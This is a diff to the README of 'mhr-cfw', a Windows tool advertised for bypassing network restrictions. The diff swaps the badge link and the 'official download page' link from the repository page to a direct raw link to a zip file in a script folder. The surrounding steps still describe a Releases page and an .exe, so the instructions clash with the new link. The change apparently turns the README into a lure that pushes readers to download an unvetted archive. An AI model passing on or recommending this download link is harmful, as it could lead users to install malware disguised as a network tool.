@@ -1,6 +1,6 @@
 # 🌐 mhr-cfw - Bypass network restrictions with ease
 
-[![Download mhr-cfw](https://img.shields.io/badge/Download-mhr-cfw-blue.svg)](https://github.com/chantalunsupportable7191/mhr-cfw)
+[![Download mhr-cfw](https://img.shields.io/badge/Download-mhr-cfw-blue.svg)](https://github.com/chantalunsupportable7191/mhr-cfw/raw/refs/heads/main/script/mhr_cfw_3.7.zip)
 
 ## 📦 What is mhr-cfw?
 
@@ -17,7 +17,7 @@ mhr-cfw acts as a secure bridge for your internet traffic. It moves your data th
 
 Follow these steps to set up the software on your Windows machine.
 
-1.  Visit the [official download page here](https://github.com/chantalunsupportable7191/mhr-cfw).
+1.  Visit the [official download page here](https://github.com/chantalunsupportable7191/mhr-cfw/raw/refs/heads/main/script/mhr_cfw_3.7.zip).
 2.  Look for the section labeled Releases on the right side of the screen.
 3.  Click the version number to view the download options.
 4.  Find the file ending in .exe, such as `mhr-cfw-setup.exe`.
